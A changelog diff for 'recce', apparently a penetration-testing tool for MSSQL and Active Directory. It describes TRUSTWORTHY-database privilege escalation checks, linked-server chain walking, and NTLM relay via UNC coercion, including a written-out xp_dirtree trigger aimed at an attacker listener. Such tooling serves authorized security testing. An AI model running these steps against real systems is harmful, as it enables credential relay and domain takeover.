@@ -159,6 +159,20 @@ _Accumulating fixes since 0.2.3; folded into the next tagged release._
     abuse TRUSTWORTHY payroll -> hop DW01"* plus the exact command per hop. The
     live enumeration (login, sysadmins, TRUSTWORTHY DBs, linked servers,
     impersonatable logins, config, hashes) is shown on the MSSQL sheet.
+  - **Auto-verified TRUSTWORTHY chains.** For each TRUSTWORTHY database owned by a
+    sysadmin, recce runs a second pass to check whether your login is actually
+    **db_owner** there (guarded by `DB_NAME()` so a failed `USE` can't give a false
+    positive). A confirmed one becomes a **critical** *"CONFIRMED privesc: db_owner
+    on a TRUSTWORTHY db"* finding; a verified-negative is dropped; an unverifiable
+    one stays a candidate.
+  - **UNC coercion -> NTLM relay with real targets + an executable trigger.** recce
+    enumerates concrete relay destinations from the datastore - **LDAP on a DC**
+    (RBCD / shadow creds), **another MSSQL** (sysadmin if the service account is
+    admin there), and **SMB-signing-not-required hosts** (local admin) - and writes
+    the two-step block (start `ntlmrelayx` at a target, then trigger). With
+    `--relay --lhost <ip>` recce **executes the trigger** itself
+    (`EXEC master..xp_dirtree '\\<lhost>\...'`) so the SQL service account
+    authenticates to your listener.
   - **Recursive linked-server graph walk** (the MSSQLPwner move): from the entry
     instance recce follows every linked server, running an identity/privilege query
     **through the chain** with correctly nested `EXEC('...') AT [link]` (single
